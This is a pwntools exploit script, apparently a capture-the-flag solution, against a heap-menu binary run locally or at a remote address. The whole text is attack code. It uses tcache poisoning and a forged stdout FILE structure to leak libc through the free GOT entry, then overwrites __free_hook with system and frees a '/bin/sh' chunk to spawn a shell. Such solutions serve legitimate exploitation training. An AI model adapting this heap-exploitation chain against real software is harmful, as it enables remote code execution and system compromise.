#coding=utf-8
from pwn import *
local = 1
argv=[""]
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwnxxx")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

# 64bit : /lib/x86_64-linux-gnu/libc.so.6 
# 32bit :
else:
    a=remote("172.16.9.21",9008)
    libc=ELF("./libc.so.6")
elf=ELF("./pwnxxx")
def debug():
    gdb.attach(a,'''
    b *(0x000000000400C84)
    b *(0x000000000400D66)
    b *(0x000000000400E6E)
    ''')
def menu(idx):
    a.recvuntil("your choice: ")
    a.sendline(str(idx))
def add(idx,size,content,flag=True):
    menu(1)
    if flag :
        a.recvuntil("index: ")
    a.sendline(str(idx))
    if flag :
        a.recvuntil("size: ")
    a.sendline(str(size))
    if flag :
        a.recvuntil("content: ")
    a.send(content)
def delete(idx):
    menu(2)
    a.recvuntil("index: ")
    a.sendline(str(idx))
def edit(idx,content):
    menu(3)
    a.recvuntil("index: ")
    a.sendline(str(idx))  
    a.recvuntil("content: ")
    a.send(content)
target_addr=0x0000000006020E8
add(2,0x20+0xe0-0x30,'A')
add(16,0x20,'A') # 0
add(1,0x28,'A') # = 4
add(2,0x28,'A') # = 5
add(3,0x28,'A') # = 6
add(4,0x10,'A')
add(5,0x28,'A')
add(5,0x28,'A')
add(5,0x28,'A')
edit(0,'A'*0x10+p64(0)+p64(0x91))
delete(1)
add(6,0x88,'A')
free_got=0x000000000602018
puts_plt=0x000000000400790
stdout=0x0000000006020A0
delete(5)
delete(5)
delete(5)
delete(3)
edit(6,'A'*0x50+p64(0)+p64(0x31)+p64(stdout))
#debug()
add(7,0x28,'\x60')
add(8,0x28,'\x60')

fake_file=p64(0xfbad1800)
fake_file+=p64(0)*3
fake_file+=p64(free_got)
#debug()
add(9,0x28,fake_file)
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["free"]
success("libc_base ==> 0x%x"%libc_base)

__free_hook=libc.symbols["__free_hook"]+libc_base
delete(7)
edit(6,'A'*0x50+p64(0)+p64(0x31)+p64(__free_hook))
#debug()
add(13,0x28,'/bin/sh\x00')
add(14,0x28,p64(libc_base+libc.symbols["system"]))
delete(13)
a.interactive()
